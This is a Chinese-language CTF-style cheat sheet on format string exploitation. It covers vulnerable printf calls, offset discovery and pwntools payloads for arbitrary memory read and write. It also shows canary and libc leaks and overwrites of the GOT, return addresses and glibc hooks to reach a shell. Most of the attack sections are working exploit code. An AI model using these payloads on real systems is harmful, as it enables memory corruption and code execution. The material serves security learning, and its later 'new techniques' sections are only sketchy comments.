# 格式化字符串 (Format String)

## 原理

`printf` 等函数的格式化字符串参数用户可控，攻击者可读取栈上数据、写任意地址，实现信息泄露和任意代码执行。

## 攻击链

### 1. 漏洞识别

```c
// 危险代码
printf(user_input);           // 直接 printf 用户输入
sprintf(buf, user_input);     // sprintf
fprintf(fp, user_input);      // fprintf
syslog(LOG_INFO, user_input); // syslog
```

### 2. 探测

```bash
# 输入 %p %p %p %p %p %p %p %p
# 看输出是否有栈地址
# 输入 AAAA%p%p%p%p
# 看是否有 0x41414141
```

### 3. 确定偏移

```python
from pwn import *

p = process('./pwn')
p.sendline(b'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p')
output = p.recv()
# 找到 0x41414141 的位置
# 假设第 6 个 %p 输出 0x41414141，则偏移为 6
```

### 4. 读取栈数据

```python
# 32 位
payload = b'%6$x'  # 读取第 6 个参数
payload = b'%6$s'  # 读取第 6 个参数指向的字符串

# 64 位
payload = b'%6$lx'
payload = b'%6$s'
```

### 5. 读取任意地址

```python
# 32 位
addr = 0x08048000
payload = p32(addr) + b'%7$s'  # 第 7 个参数是 addr

# 64 位
addr = 0x404000
payload = p64(addr) + b'%8$s'
# 注意对齐
```

### 6. 写任意地址

```python
# %n: 写入已输出字符数
# %hn: 写 2 字节
# %hhn: 写 1 字节
# %n: 写 4 字节（32 位）/ 8 字节（64 位）

# 32 位写 0x0804a024 = 0x12345678
target = 0x0804a024
value = 0x12345678

payload = p32(target)     # 写低 2 字节
payload += p32(target + 2)  # 写高 2 字节
payload += b'%' + str((value & 0xffff) - 8).encode() + b'c%6$hn'
payload += b'%' + str(((value >> 16) & 0xffff) - (value & 0xffff)).encode() + b'c%7$hn'
```

### 7. pwntools fmtstr

```python
from pwn import *

# 自动生成 payload
payload = fmtstr_payload(6, {0x0804a024: 0x12345678})
# 6 是偏移
# {addr: value} 是要写的地址和值

p.sendline(payload)
```

## 利用场景

### 1. 泄露 Canary

```python
# 假设 Canary 在第 7 个参数
payload = b'%7$p'
p.sendline(payload)
canary = int(p.recv(), 16)
```

### 2. 泄露 libc 地址

```python
# 泄露 __libc_start_main 的返回地址
# 假设在第 9 个参数
payload = b'%9$p'
p.sendline(payload)
libc_addr = int(p.recv(), 16)
libc_base = libc_addr - libc.symbols['__libc_start_main'] - 240
```

### 3. 泄露栈地址

```python
# 泄露栈上保存的栈地址
payload = b'%p.%p.%p.%p.%p.%p.%p.%p'
# 找到栈地址
```

### 4. 覆盖 GOT 表

```python
# 将 printf 的 GOT 改为 system
from pwn import *

elf = ELF('./pwn')
printf_got = elf.got['printf']
system_addr = 0x08048450

payload = fmtstr_payload(6, {printf_got: system_addr})
p.sendline(payload)
p.sendline(b'/bin/sh')
```

### 5. 覆盖返回地址

```python
# 覆盖栈上的返回地址
ret_addr = 0xffffd024  # 栈上返回地址位置
target = 0x08048500    # 想跳转的地址

payload = fmtstr_payload(6, {ret_addr: target})
```

### 6. 覆盖 __malloc_hook

```python
# glibc < 2.34
# 触发 malloc 错误时调用 __malloc_hook
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = 0x4527a

payload = fmtstr_payload(6, {malloc_hook: one_gadget})
# 然后触发 malloc 错误
p.sendline(b'%100000c')  # 触发 malloc
```

### 7. 覆盖 __free_hook

```python
# glibc < 2.34
free_hook = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']

payload = fmtstr_payload(6, {free_hook: system_addr})
p.sendline(payload)
p.sendline(b'/bin/sh')  # 触发 free
```

### 8. 覆盖 __exit_funcs

```python
# glibc 2.34+
# 通过覆盖 __exit_funcs 实现 RCE
```

## 绕过技巧

### 1. 长度限制

```python
# 使用 $hn 分多次写
# 使用短地址
# 使用栈迁移
```

### 2. 过滤特殊字符

```python
# 如果过滤 %，无法利用
# 如果过滤 $，可以用 %c%c%c...%n
# 如果过滤 n，无法写
```

### 3. 无回显

```python
# 盲格式化字符串
# 通过 %n 写入
# 通过侧信道（时间、错误）
```

### 4. 多次调用

```python
# 如果只能调用一次
# 用 fmtstr_payload 一次写多个地址
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 利用

```python
# 无 hooks
# 1. 覆盖 __exit_funcs
# 2. 覆盖 _IO_FILE
# 3. 覆盖 TLS 中的 __stack_chk_guard
# 4. 覆盖 _environ 泄露栈地址
```

### 2. FORTIFY_SOURCE

```python
# GCC FORTIFY_SOURCE 检测格式化字符串
# %n 在某些情况下被禁用
# 需要绕过
```

### 3. 现代编译器优化

```python
# GCC 13+ 对格式化字符串的优化
# 可能影响偏移计算
```

### 4. ARM64 格式化字符串

```python
# ARM64 调用约定
# 前 8 个参数在寄存器 x0-x7
# 偏移计算不同
```

### 5. 内核格式化字符串

```python
# 内核中的 printk
# 通过格式化字符串泄露内核地址
# 通过格式化字符串写内核数据
```

### 6. 嵌入式设备

```python
# 路由器、摄像头等
# MIPS/ARM 架构
# 格式化字符串漏洞常见
```

### 7. 现代语言

```python
# Rust 的 format!
# Go 的 fmt.Printf
# 各语言的格式化字符串漏洞
```

### 8. 沙箱环境

```python
# seccomp 限制
# 通过格式化字符串绕过
```

## 工具推荐

- **pwntools** — fmtstr_payload 自动生成
- **format_string_exploit** — 自动化利用
- **gdb + pwndbg** — 动态调试

## 参考链接

- [ctf-wiki 格式化字符串](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr/)
- [Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack)
- [pwntools fmtstr](https://docs.pwntools.com/en/stable/fmtstr.html)
